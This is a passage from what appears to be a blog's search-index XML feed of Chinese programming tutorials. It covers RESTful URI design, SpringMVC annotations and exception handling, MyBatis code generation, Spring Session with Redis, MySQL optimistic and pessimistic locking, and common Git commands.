Transfer）访问一个网站，就代表了客户端和服务器的一个互动过程。在这个过程中，势必涉及到数据和状态的变化。 互联网通信协议HTTP协议，是一个无状态协议。这意味着，所有的状态都保存在服务器端。因此，如果客户端想要操作服务器，必须通过某种手段，让服务器端发生”状态转化”（State Transfer）。而这种转化是建立在表现层之上的，所以就是”表现层状态转化”。 客户端用到的手段，只能是HTTP协议。具体来说，就是HTTP协议里面，四个表示操作方式的动词：GET、POST、PUT、DELETE。它们分别对应四种基本操作：GET用来获取资源，POST用来新建资源（也可以用于更新资源），PUT用来更新资源，DELETE用来删除资源。 综述综合上面的解释，我们总结一下什么是RESTful架构： （1）每一个URI代表一种资源； （2）客户端和服务器之间，传递这种资源的某种表现层； （3）客户端通过四个HTTP动词，对服务器端资源进行操作，实现”表现层状态转化”。 误区RESTful架构有一些典型的设计误区。 最常见的一种设计错误，就是URI包含动词。因为”资源”表示一种实体，所以应该是名词，URI不应该有动词，动词应该放在HTTP协议中。 举例来说，某个URI是/posts/show/1，其中show是动词，这个URI就设计错了，正确的写法应该是/posts/1，然后用GET方法表示show。 如果某些动作是HTTP动词表示不了的，你就应该把动作做成一种资源。比如网上汇款，从账户1向账户2汇款500元，错误的URI是： POST /accounts/1/transfer/500/to/2 正确的写法是把动词transfer改成名词transaction，资源不能是动词，但是可以是一种服务： POST /transaction HTTP/1.1 Host: 127.0.0.1 from=1&amp;to=2&amp;amount=500.00 另一个设计误区，就是在URI中加入版本号： http://www.example.com/app/1.0/foo http://www.example.com/app/1.1/foo http://www.example.com/app/2.0/foo 因为不同的版本，可以理解成同一种资源的不同表现形式，所以应该采用同一个URI。版本号可以在HTTP请求头信息的Accept字段中进行区分（参见Versioning REST Services）： Accept: vnd.example-com.foo+json; version=1.0 Accept: vnd.example-com.foo+json; version=1.1 Accept: vnd.example-com.foo+json; version=2.0-怕【]]></content>
      <categories>
        <category>架构</category>
      </categories>
      <tags>
        <tag>RESTful</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SpringMVC异常处理]]></title>
    <url>%2F2018%2F04%2F02%2F2018-4-2-SpringMVC%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[springmvc提供了异常处理机制，可以将指定异常映射成http状态或者对指定异常进行相应处理。主要包括以下几个注解：@ResponseStatus用于添加在一个异常类上，将其映射成为特定的http状态码@ExceptionHandle用于方法上，当指定异常发生是进行处理，如果用于某个controller上时，会处理该controller所有方法抛出的相应异常。当@ExceptionHandle和@ControllerAdvice组合使用时，就能捕获所有的异常进行处理。]]></content>
      <categories>
        <category>SpingMVC</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SpringMVC常用注解]]></title>
    <url>%2F2018%2F03%2F15%2F2018-3-15-SpringMVC%E5%B8%B8%E7%94%A8%E6%B3%A8%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[@Controller用于注解控制层，@Controller 用于标记在一个类上，使用它标记的类就是一个SpringMVC Controller 对象。分发处理器将会扫描使用了该注解的类的方法，并检测该方法是否使用了@RequestMapping 注解。@Controller 只是定义了一个控制器类，而使用@RequestMapping 注解的方法才是真正处理请求的处理器。 @RequestMappingRequestMapping是一个用来处理请求地址映射的注解，可用于类或方法上。用于类上，表示类中的所有响应请求的方法都是以该地址作为父路径。 返回值会通过视图解析器解析为实际的物理视图，对于 InternalResourceViewResolver 视图解析器，会做如下的解析： 通过 prefix + returnVal + suffix 这样的方式得到实际的物理视图，然后做转发操作； 12345&lt;!-- 配置视图解析器：如何把 handler 方法返回值解析为实际的物理视图 --&gt; &lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/WEB-INF/templates/"&gt;&lt;/property&gt; &lt;property name="suffix" value=".jsp"&gt;&lt;/property&gt; &lt;/bean&gt; RequestMapping注解有六个属性: 1、 value value：指定请求的实际地址； ​ 2、method； method： 指定请求的method类型， GET、POST、PUT、DELETE等，下面例子的@PathVariable后面讲解： 1234567891011121314151617181920212223242526272829303132/** * Rest 风格的 URL（以 CRUD 为例）： * 新增：/order POST * 修改：/order/1 PUT * 获取：/order/1 GET * 删除：/order/1 DELETE * @param id * @return */ @RequestMapping(value = "/testRestPut/&#123;id&#125;", method = RequestMethod.PUT) public String testRestPut(@PathVariable int id) &#123; System.out.println("testRestPut:" + id); return SUCCESS; &#125; @RequestMapping(value = "/testRestDelete/&#123;id&#125;", method = RequestMethod.DELETE) public String testRestDelete(@PathVariable int id) &#123; System.out.println("testRestDelete:" + id); return SUCCESS; &#125; @RequestMapping(value = "/testRestPost/&#123;id&#125;", method = RequestMethod.POST) public String testRestPost(@PathVariable int id) &#123; System.out.println("testRestPost:" + id); return SUCCESS; &#125; @RequestMapping("/testRestGet") public String testRestGet() &#123; System.out.println("testRestGet"); return SUCCESS; &#125; 3、consumes consumes： 指定处理请求的提交内容类型（Content-Type），例如application/json, text/html; 4、produces produces: 指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回； 5、params params： 指定request中必须包含某些参数值是，才让该方法处理。 6、headers headers： 指定request中必须包含某些指定的header值，才能让该方法处理请求。 @RequestMapping(“/helloword/?/aa”) 的 Ant 路径,匹配符： ?：匹配文件名的一个字符 *：匹配文件名的所有字符 **：匹配多层路径 @RequestMapping(“/testPojo”) POJO类用法： 12345 @RequestMapping("/testPojo")public String testPojo(User user) &#123; System.out.println("testPojo:" + user); return "success";&#125; @RequestMapping(“/testPojo”) Map用法： 12345 @RequestMapping("/testMap")public String testMap(Map&lt;String, Object&gt; map) &#123; map.put("names", Arrays.asList("Tomcat", "Eclipse", "JavaEE")); return "success";&#125; @RequestMapping(“/testPojo”) ModelAndView用法： 123456@RequestMapping("/index") public ModelAndView testModelAndView() &#123; ModelAndView mav = new ModelAndView(); mav.setViewName("index"); return mav; &#125; 一般来说都用第二种 12345 @RequestMapping("/index")public String testModelAndView() &#123; modelAndView.addObject("author","Aunsetre"); return "index";&#125; @Resource和@Autowired @Resource和@Autowired都是做bean的注入时使用，其实@Resource并不是Spring的注解，它的包是javax.annotation.Resource，需要导入，但是Spring支持该注解的注入。 1、共同点 两者都可以写在字段和setter方法上。两者如果都写在字段上，那么就不需要再写setter方法。 2、不同点 （1）@Autowired @Autowired为Spring提供的注解，需要导入包org.springframework.beans.factory.annotation.Autowired;只按照byType注入。 @Autowired注解是按照类型（byType）装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许null值，可以设置它的required属性为false。如果我们想使用按照名称（byName）来装配，可以结合@Qualifier注解一起使用。如下： 12345public class HelloWorld&#123; @Autowired @Qualifier("userDao") private UserDao userDao; &#125; （2）@Resource @Resource默认按照ByName自动注入，由J2EE提供，需要导入包javax.annotation.Resource。@Resource有两个重要的属性：name和type，而Spring将@Resource注解的name属性解析为bean的名字，而type属性则解析为bean的类型。所以，如果使用name属性，则使用byName的自动注入策略，而使用type属性时则使用byType自动注入策略。如果既不制定name也不制定type属性，这时将通过反射机制使用byName自动注入策略。 注：最好是将@Resource放在setter方法上，因为这样更符合面向对象的思想，通过set、get去操作属性，而不是直接去操作属性。 @PathVariable 用于将请求URL中的模板变量映射到功能处理方法的参数上，即取出uri模板中的变量作为参数。如： 123456789101112131415161718192021@Controller public class TestController &#123; @RequestMapping(value="/user/&#123;userId&#125;/roles/&#123;roleId&#125;",method = RequestMethod.GET) public String getLogin(@PathVariable("userId") String userId, @PathVariable("roleId") String roleId)&#123; System.out.println("User Id : " + userId); System.out.println("Role Id : " + roleId); return "hello"; &#125; @RequestMapping(value="/product/&#123;productId&#125;",method = RequestMethod.GET) public String getProduct(@PathVariable("productId") String productId)&#123; System.out.println("Product Id : " + productId); return "hello"; &#125; @RequestMapping(value="/javabeat/&#123;regexp1:[a-z-]+&#125;", method = RequestMethod.GET) public String getRegExp(@PathVariable("regexp1") String regexp1)&#123; System.out.println("URI Part 1 : " + regexp1); return "hello"; &#125; &#125; @CookieValue 作用：用来获取Cookie中的值； 参数： value：参数名称 required：是否必须 defaultValue：默认值 使用案例： 12345@RequestMapping("/testCookieValue")public String testCookieValue(@CookieValue("JSESSIONID") String sessionId) &#123; System.out.println("JSESSIONID = " + sessionId); return "success";&#125; @RequestParam @RequestParam用于将请求参数区数据映射到功能处理方法的参数上，用例： 12345678910/** * @RequestParam("id") 带参映射 * @param id * @return */ @RequestMapping("/testRequestParam") public String testRequestParam(@RequestParam("id") int id) &#123; System.out.println("testRequestParam " + id); return "success"; &#125; @SessionAttributes @SessionAttributes即将值放到session作用域中，写在class上面。 @SessionAttributes 除了可以通过属性名指定需要放到会话中的属性外（value 属性值）， 还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）,用例： 12345678910111213141516171819202122232425262728293031package com.aunsetre.controller;import java.util.Map;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.SessionAttributes;import com.cqvie.model.User;@SessionAttributes(value = &#123;"user"&#125;, types = &#123;String.class&#125;)@RequestMapping("/springmvc")@Controllerpublic class SessionAttributesTest &#123; /** * @SessionAttributes * 除了可以通过属性名指定需要放到会话中的属性外（value 属性值）， * 还可以通过模型属性的对象类型指定哪些模型属性需要放到会话中（types 属性值）。 * 注意： 该注解只能放在类的上面，不能放在方法上面 * * @return */ @RequestMapping("/testSessionAttributes") public String testSessionAttributes(Map&lt;String, Object&gt; map) &#123; User user = new User(1, "刘邦", "qwe", "123", "辽宁"); map.put("user", user); map.put("school", "重庆"); return "success"; &#125;&#125; @ModelAttribute 代表的是：该Controller的所有方法在调用前，先执行此@ModelAttribute方法，可用于注解和方法参数中，可以把这个@ModelAttribute特性，应用在BaseController当中，所有的Controller继承BaseController，即可实现在调用Controller时，先执行@ModelAttribute方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package com.cqvie.yjq;import java.util.Map;import org.springframework.stereotype.Controller;import org.springframework.web.bind.annotation.ModelAttribute;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import com.cqvie.model.User;@Controller@RequestMapping("/springmvc")public class ModelAttributeTest &#123; private static final String SUCCESS = "success"; /** * 1.有 @ModelAttribute 标记的方法，会在每个目标方法执行之前被 SpringMVC 调用 * 2.@ModelAttribute注解也可以修饰目标方法POJO类形的入参，其value的属性值有如下作用： * 1）SpringMVC会使用value属性值在implicitModel中查找对应的对象，若存在则直接传入到目标方法的入参中 * 2）SpringMVC会以value为key,POJO类型的对象为value，存入的request中 * * @param id * @param map */ @ModelAttribute public void getUser(@RequestParam(value = "id", required = false) int id, Map&lt;String, Object&gt; map) &#123; //模拟数据库中获取对象 User user = new User(1, "刘邦", "123", "023", "重庆"); System.out.println("从数据库中获取一个对象：" + user); map.put("abc", user); &#125; /** * 运行流程： * 1.执行@ModelAttribute注解修饰的方法，从数据库中取出对象，把对象放入Map中，键为：user； * 2.SpringMVC从Map中取出User对象，并把表单的请求参数赋值给该User对象的对应属性； * 3.SpringMVC把上述对象传入目标方法的参数。 * * 注意：在@ModelAttribute修饰的方法中，放入到Map时的键需要和目标方法入参类型的第一个字母小写的字符串一致 * * @param user * @return */ @RequestMapping("/testModelAttribute") public String testModelAttribute(@ModelAttribute("abc") User user) &#123; System.out.println("修改：" + user); return SUCCESS; &#125;&#125; @ResponseBody 作用： 该注解用于将Controller的方法返回的对象，通过适当的HttpMessageConverter转换为指定格式后，写入到Response对象的body数据区。 使用时机：返回的数据不是html标签的页面，而是其他某种格式的数据时（如json、xml等）使用；]]></content>
      <categories>
        <category>SpingMVC</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[使用IDEA生成Mybatis逆向工程]]></title>
    <url>%2F2018%2F03%2F05%2F%E4%BD%BF%E7%94%A8IDEA%E7%94%9F%E6%88%90Mybatis%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[以往我们在开发时都需要通过数据库中的表然后自己在po包下建立相对应的pojo类，并要创建相应的mapper.xml写出对表的所有操作，而使用mybatis逆向工程就不用我们自己再编写pojo类与相应的mapper.java和mapper.xml文件，它可以自动对单表生成sql，包括:mapper.xml、mapper.java、表名.java(po类)。是不是很方便？接下来我将为你们介绍如何使用mybatis的逆向工程，只需三步便可以简单做到。 首先我们需要在官网下载:逆向工程开发文档以及jar包:mybatis-generator-core-bundle。为什么我的标题要注明使用的开发工具是IDEA呢?用IDEA的好处就是可以使用Maven依赖，但是此篇文章中我们就新建一个普通工程，所以此篇文章讲解的配置在其他开发工具中能实现同样的效果。 1.逆向工程使用配置1.1jar包的导入这里我们需要导入四个包，1.mybatis3.xjar包。2.逆向工程核心包。3.数据库连接包。4.log4j.jar，用于输出日志。目录如下: .2配置逆向工程的配置文件 在src包下创建逆向工程配置文件generatorConfig.xml,内容如下，直接拷贝官网介绍的内容即可: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE generatorConfiguration PUBLIC "-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN" "http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd"&gt;&lt;generatorConfiguration&gt; &lt;context id="testTables" targetRuntime="MyBatis3"&gt; &lt;commentGenerator&gt; &lt;!-- 是否去除自动生成的注释 true：是 ： false:否 --&gt; &lt;property name="suppressAllComments" value="true" /&gt; &lt;/commentGenerator&gt; &lt;!--数据库连接的信息：驱动类、连接地址、用户名、密码 --&gt; &lt;jdbcConnection driverClass="com.mysql.jdbc.Driver" connectionURL="jdbc:mysql://localhost:3306/mybatis" userId="root" password="xiaxunwu1996."&gt; &lt;/jdbcConnection&gt; &lt;!-- &lt;jdbcConnection driverClass="oracle.jdbc.OracleDriver" connectionURL="jdbc:oracle:thin:@127.0.0.1:1521:yycg" userId="yycg" password="yycg"&gt; &lt;/jdbcConnection&gt; --&gt; &lt;!-- 默认false，把JDBC DECIMAL 和 NUMERIC 类型解析为 Integer，为 true时把JDBC DECIMAL 和 NUMERIC 类型解析为java.math.BigDecimal --&gt; &lt;javaTypeResolver&gt; &lt;property name="forceBigDecimals" value="false" /&gt; &lt;/javaTypeResolver&gt; &lt;!-- targetProject:生成PO类的位置 --&gt; &lt;javaModelGenerator targetPackage="po" targetProject=".\src"&gt; &lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt; &lt;property name="enableSubPackages" value="false" /&gt; &lt;!-- 从数据库返回的值被清理前后的空格 --&gt; &lt;property name="trimStrings" value="true" /&gt; &lt;/javaModelGenerator&gt; &lt;!-- targetProject:mapper映射文件生成的位置 --&gt; &lt;sqlMapGenerator targetPackage="mapper" targetProject=".\src"&gt; &lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt; &lt;property name="enableSubPackages" value="false" /&gt; &lt;/sqlMapGenerator&gt; &lt;!-- targetPackage：mapper接口生成的位置 --&gt; &lt;javaClientGenerator type="XMLMAPPER" targetPackage="mapper" targetProject=".\src"&gt; &lt;!-- enableSubPackages:是否让schema作为包的后缀 --&gt; &lt;property name="enableSubPackages" value="false" /&gt; &lt;/javaClientGenerator&gt; &lt;!-- 指定数据库表 --&gt; &lt;table tableName="items"&gt;&lt;/table&gt; &lt;table tableName="orders"&gt;&lt;/table&gt; &lt;table tableName="orderdetail"&gt;&lt;/table&gt; &lt;!-- &lt;table schema="" tableName="sys_user"&gt;&lt;/table&gt; &lt;table schema="" tableName="sys_role"&gt;&lt;/table&gt; &lt;table schema="" tableName="sys_permission"&gt;&lt;/table&gt; &lt;table schema="" tableName="sys_user_role"&gt;&lt;/table&gt; &lt;table schema="" tableName="sys_role_permission"&gt;&lt;/table&gt; --&gt; &lt;!-- 有些表的字段需要指定java类型 &lt;table schema="" tableName=""&gt; &lt;columnOverride column="" javaType="" /&gt; &lt;/table&gt; --&gt; &lt;/context&gt;&lt;/generatorConfiguration&gt; 需要修改的地方: javaModelGenerator,生成PO类的位置 sqlMapGenerator,mapper映射文件生成的位置 javaClientGenerator,mapper接口生成的位置 table,其tableName属性对应数据库中相应表 1.3执行生成代码在src包下新建一个Generator.java文件，内容如下，也是拷贝的官网中介绍的代码: 123456789101112131415161718192021222324252627282930313233343536import java.io.File;import java.util.ArrayList;import java.util.List;import org.mybatis.generator.api.MyBatisGenerator;import org.mybatis.generator.config.Configuration;import org.mybatis.generator.config.xml.ConfigurationParser;import org.mybatis.generator.internal.DefaultShellCallback;public class GeneratorSqlmap &#123; public void generator() throws Exception&#123; List&lt;String&gt; warnings = new ArrayList&lt;String&gt;(); boolean overwrite = true; //指定 逆向工程配置文件 File configFile = new File("src/generatorConfig.xml"); ConfigurationParser cp = new ConfigurationParser(warnings); Configuration config = cp.parseConfiguration(configFile); DefaultShellCallback callback = new DefaultShellCallback(overwrite); MyBatisGenerator myBatisGenerator = new MyBatisGenerator(config, callback, warnings); myBatisGenerator.generate(null); &#125; public static void main(String[] args) throws Exception &#123; try &#123; GeneratorSqlmap generatorSqlmap = new GeneratorSqlmap(); generatorSqlmap.generator(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 注意，这里new File中传入的参数只能是src/generatorConfig.xml而不能为generatorConfig.xml，否则会出现java.io.FileNotFoundException: generatorConfig.xml (No such file or directory)的报错信息，运行程序，在打印台看到输出日志信息为: 然后再点击文件目录上的刷新图标刷新文件目录，文件目录下出现我们通过单表映射出来的po类包以及mapper包下的mapper.xml和mapper.java，刚开始的工程目录如下:运行程序后最后的工程目录结构如下: 这样我们便通过mybatis的逆向工程完成了通过单表直接创建出对应的mapper.java和mapper.xml的工作。 2.逆向工程的应用逆向工程往往是单独的建立一个普通工程如A，通过运行逆向工程生成相应的mapper和po后然后再将这两个包拷贝到我们使用到ssm框架创建的web项目，而不是直接在web项目中使用逆向工程。 通过运行上述的程序，我们便通过数据库中的表快速的生成了相应的po类和mapper，而不用我们程序员自己再编写相应的po类和mapper，为我们带来了很大的方便，所以这个一定要学会，在后续开发中只要使用到mybatis的地方我们都会通过mybatis的逆向工程自动为我们生成mapper和po类。]]></content>
      <categories>
        <category>Mybatis</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Spring Session整合]]></title>
    <url>%2F2018%2F03%2F01%2FSpring-Session%E6%95%B4%E5%90%88%2F</url>
    <content type="text"><![CDATA[花了大半天时间，解决了springMVC项目增加spring-session共享session报了异常 java.lang.ClassNotFoundException:com.lambdaworks. 花了大半天时间，解决了springMVC项目增加spring-session共享session报了异常 12java.lang.ClassNotFoundException:com.lambdaworks.redis.AbstractRedisClientjava.lang.ClassNotFoundException:com.lambdaworks.redis.RedisException 前情项目做了前后端分离，springMVC项目部署在三台tomcat上，前端部署在另三台tomcat上，然后HA做了分发处理，使一个用户访问后，后面的访问都会是其中的某一台tomcat… 理想是美好的，现实中，会出现登录前后会有连接是访问了不同的tomcat，我没有运维权限，也不想接这个坑，所以就从代码上处理吧。代码上怎么处理呢，我觉得很简单，session共享不就行了，使用spring-session超简单，几行代码就搞定了。注意：这里的超简单是在spring-boot中使用才超简单。spring-boot中使用redis共享session配置：1、pom.xml加依赖 12345678&lt;dependency&gt; &lt;groupId&gt;org.springframework.session&lt;/groupId&gt; &lt;artifactId&gt;spring-session&lt;/artifactId&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;org.springframework.session&lt;/groupId&gt; &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt;&lt;/dependency&gt; 2、application.properties加配置： 1spring.session.store-type=redis 搞定但是，我的项目不是spring-boot项目，所以参考官网说的配吧。我的部署环境jdk是1.7、tomcat7，所以sprint-session 2.0.x是肯定不能支持了，所以还是使用1.3.3吧，官网手册很简单，有web.xml，所以配置分2步：1、 在spring-context.xml中加上配置： 123&lt;context:annotation-config/&gt;&lt;bean class="org.springframework.session.data.redis.config.annotation.web.http.RedisHttpSessionConfiguration"/&gt;&lt;bean class="org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory"/&gt; 2、在web.xml加上 1234567891011&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt; /WEB-INF/spring/*.xml &lt;/param-value&gt;&lt;/context-param&gt;&lt;listener&gt; &lt;listener-class&gt; org.springframework.web.context.ContextLoaderListener &lt;/listener-class&gt;&lt;/listener&gt; 当然，要在pom.xml上加上依赖包 12345678910&lt;dependency&gt; &lt;groupId&gt;org.springframework.session&lt;/groupId&gt; &lt;artifactId&gt;spring-session&lt;/artifactId&gt; &lt;version&gt;1.3.0.RELEASE&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;org.springframework.session&lt;/groupId&gt; &lt;artifactId&gt;spring-session-data-redis&lt;/artifactId&gt; &lt;version&gt;1.3.0.RELEASE&lt;/version&gt; &lt;/dependency&gt; 然后…就是报了异常 1java.lang.ClassNotFoundException:com.lambdaworks.redis.AbstractRedisClient 或 1java.lang.ClassNotFoundException:com.lambdaworks.redis.RedisException 我知道是会有版本兼容的问题，所以不断切换版本试试看，然后就试了大半天，结果再一仔细看配置：知道com.lambdaworks是哪个包不：io.lettuce。所以的，其实是因为我使用的是jedis包，所以根本不需要这一行代码 1&lt;bean class="org.springframework.data.redis.connection.lettuce.LettuceConnectionFactory"/&gt; 解决因为我使用的是jedis包，而不是也不需要用到io.lettuce包，所以在spring-context.xml中配置应该是这样的： 123456789101112131415161718&lt;!-- Redis 线程池配置 --&gt;&lt;bean id="jedisPoolConfig" class="redis.clients.jedis.JedisPoolConfig"&gt; &lt;property name="maxTotal" value="$&#123;redis.pool.maxActive&#125;" /&gt; &lt;property name="maxIdle" value="$&#123;redis.pool.maxIdle&#125;" /&gt; &lt;property name="maxWaitMillis" value="$&#123;redis.pool.maxWaitMillis&#125;" /&gt; &lt;property name="testOnBorrow" value="$&#123;redis.pool.testOnBorrow&#125;" /&gt;&lt;/bean&gt;&lt;bean id="jedisConnFactory" class="org.springframework.data.redis.connection.jedis.JedisConnectionFactory"&gt; &lt;property name="hostName" value="$&#123;redis.hostname&#125;" /&gt; &lt;property name="password" value="$&#123;redis.password&#125;" /&gt; &lt;property name="port" value="$&#123;redis.port&#125;" /&gt; &lt;property name="usePool" value="$&#123;redis.usePool&#125;" /&gt; &lt;property name="poolConfig" ref="jedisPoolConfig" /&gt;&lt;/bean&gt;&lt;!-- spring-session共享支持 --&gt;&lt;context:annotation-config/&gt;&lt;bean class="org.springframework.session.data.redis.config.annotation.web.http.RedisHttpS]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>Spring-Session</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解乐观锁与悲观锁]]></title>
    <url>%2F2018%2F02%2F10%2F%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E4%B9%90%E8%A7%82%E9%94%81%E4%B8%8E%E6%82%B2%E8%A7%82%E9%94%81%2F</url>
    <content type="text"><![CDATA[数据库管理系统（DBMS）中的并发控制的任务是确保在多个事务同时存取数据库中同一数据时不破坏事务的隔离性和统一性以及数据库的统一性。 乐观并发控制(乐观锁)和悲观并发控制（悲观锁）是并发控制主要采用的技术手段。 无论是悲观锁还是乐观锁，都是人们定义出来的概念，可以认为是一种思想。其实不仅仅是关系型数据库系统中有乐观锁和悲观锁的概念，像memcache、hibernate、tair等都有类似的概念。 针对于不同的业务场景，应该选用不同的并发控制方式。所以，不要把乐观并发控制和悲观并发控制狭义的理解为DBMS中的概念，更不要把他们和数据中提供的锁机制（行锁、表锁、排他锁、共享锁）混为一谈。其实，在DBMS中，悲观锁正是利用数据库本身提供的锁机制来实现的。 下面来分别学习一下悲观锁和乐观锁。 悲观锁 在关系数据库管理系统里，悲观并发控制（又名“悲观锁”，Pessimistic Concurrency Control，缩写“PCC”）是一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作都某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。悲观并发控制主要用于数据争用激烈的环境，以及发生并发冲突时使用锁保护数据的成本要低于回滚事务的成本的环境中。 悲观锁，正如其名，它指的是对数据被外界（包括本系统当前的其他事务，以及来自外部系统的事务处理）修改持保守态度(悲观)，因此，在整个数据处理过程中，将数据处于锁定状态。 悲观锁的实现，往往依靠数据库提供的锁机制 （也只有数据库层提供的锁机制才能真正保证数据访问的排他性，否则，即使在本系统中实现了加锁机制，也无法保证外部系统不会修改数据） 在数据库中，悲观锁的流程如下： 在对任意记录进行修改前，先尝试为该记录加上排他锁（exclusive locking）。 如果加锁失败，说明该记录正在被修改，那么当前查询可能要等待或者抛出异常。 具体响应方式由开发者根据实际需要决定。 如果成功加锁，那么就可以对记录做修改，事务完成后就会解锁了。 其间如果有其他对该记录做修改或加排他锁的操作，都会等待我们解锁或直接抛出异常。 MySQL InnoDB中使用悲观锁 要使用悲观锁，我们必须关闭mysql数据库的自动提交属性，因为MySQL默认使用autocommit模式，也就是说，当你执行一个更新操作后，MySQL会立刻将结果进行提交。set autocommit=0; 12345678910//0.开始事务begin;/begin work;/start transaction; (三者选一就可以)//1.查询出商品信息select status from t_goods where id=1 for update;//2.根据商品信息生成订单insert into t_orders (id,goods_id) values (null,1);//3.修改商品status为2update t_goods set status=2;//4.提交事务commit;/commit work; 上面的查询语句中，我们使用了select…for update的方式，这样就通过开启排他锁的方式实现了悲观锁。此时在t_goods表中，id为1的 那条数据就被我们锁定了，其它的事务必须等本次事务提交之后才能执行。这样我们可以保证当前的数据不会被其它事务修改。 上面我们提到，使用select…for update会把数据给锁住，不过我们需要注意一些锁的级别，MySQL InnoDB默认行级锁。行级锁都是基于索引的，如果一条SQL语句用不到索引是不会使用行级锁的，会使用表级锁把整张表锁住，这点需要注意。 优点与不足悲观并发控制实际上是“先取锁再访问”的保守策略，为数据处理的安全提供了保证。但是在效率方面，处理加锁的机制会让数据库产生额外的开销，还有增加产生死锁的机会；另外，在只读型事务处理中由于不会产生冲突，也没必要使用锁，这样做只能增加系统负载；还有会降低了并行性，一个事务如果锁定了某行数据，其他事务就必须等待该事务处理完才可以处理那行数 乐观锁 在关系数据库管理系统里，乐观并发控制（又名“乐观锁”，Optimistic Concurrency Control，缩写“OCC”）是一种并发控制的方法。它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。乐观事务控制最早是由孔祥重（H.T.Kung）教授提出。 乐观锁（ Optimistic Locking ） 相对悲观锁而言，乐观锁假设认为数据一般情况下不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，如果发现冲突了，则让返回用户错误的信息，让用户决定如何去做。 相对于悲观锁，在对数据库进行处理的时候，乐观锁并不会使用数据库提供的锁机制。一般的实现乐观锁的方式就是记录数据版本。 数据版本,为数据增加的一个版本标识。当读取数据时，将版本标识的值一同读出，数据每更新一次，同时对版本标识进行更新。当我们提交更新的时候，判断数据库表对应记录的当前版本信息与第一次取出来的版本标识进行比对，如果数据库表当前版本号与第一次取出来的版本标识值相等，则予以更新，否则认为是过期数据。 实现数据版本有两种方式，第一种是使用版本号，第二种是使用时间戳。 使用版本号实现乐观锁使用版本号时，可以在数据初始化时指定一个版本号，每次对数据的更新操作都对版本号执行+1操作。并判断当前版本号是不是该数据的最新的版本号。 12345671.查询出商品信息select (status,status,version) from t_goods where id=#&#123;id&#125;2.根据商品信息生成订单3.修改商品status为2update t_goods set status=2,version=version+1where id=#&#123;id&#125; and version=#&#123;version&#125;; 优点与不足乐观并发控制相信事务之间的数据竞争(data race)的概率是比较小的，因此尽可能直接做下去，直到提交的时候才去锁定，所以不会产生任何锁和死锁。但如果直接简单这么做，还是有可能会遇到不可预期的结果，例如两个事务都读取了数据库的某一行，经过修改以后写回数据库，这时就遇到了问题。]]></content>
      <categories>
        <category>MySql</category>
      </categories>
      <tags>
        <tag>SQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Git常用命令]]></title>
    <url>%2F2018%2F02%2F05%2FGit%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[创建版本库在当前目录新建一个Git代码库 $ git init 新建一个目录，将其初始化为Git代码库 $ git init [project-name] 下载一个项目和它的整个代码历史 $ git clone [url] 添加/删除添加指定文件到暂存区 $ git add [file1] [file2] … 添加指定目录到暂存区，包括子目录 $ git add [dir] 添加当前目录的所有文件到暂存区 $ git add . 添加每个变化前，都会要求确认对于同一个文件的多处变化，可以实现分次提交 $ git add -p 删除工作区文件，并且将这次删除放入暂存区 $ git rm [file1] [file2] … 停止追踪指定文件，但该文件会保留在工作区 $ git rm –cached [file] 改名文件，并且将这个改名放入暂存区 $ git mv [file-original] [file-renamed] 提交提交暂存区到仓库区 $ git commit -m [message] 提交暂存区的指定文件到仓库区 $ git commit [file1] [file2] … -m [message] 提交工作区自上次commit之后的变化，直接到仓库区 $ git commit -a 提交时显示所有diff信息 $ git commit -v 使用一次新的commit，替代上一次提交如果代码没有任何新变化，则用来改写上一次commit的提交信息 $ git commit –amend -m [message] 重做上一次commit，并包括指定文件的新变化 $ git commit –amend [file1] [file2] … 分支列出所有本地分支 $ git branch 列出所有远程分支 $ git branch -r 列出所有本地分支和远程分支 $ git branch -a 新建一个分支，但依然停留在当前分支 $ git branch [branch-name] 新建一个分支，并切换到该分支 $ git checkout -b [branch] 新建一个分支，指向指定commit $ git branch [branch] [commit] 新建一个分支，与指定的远程分支建立追踪关系 $ git branch –track [branch] [remote-branch] 切换到指定分支，并更新工作区 $ git checkout [branch-name] 切换到上一个分支 $ git 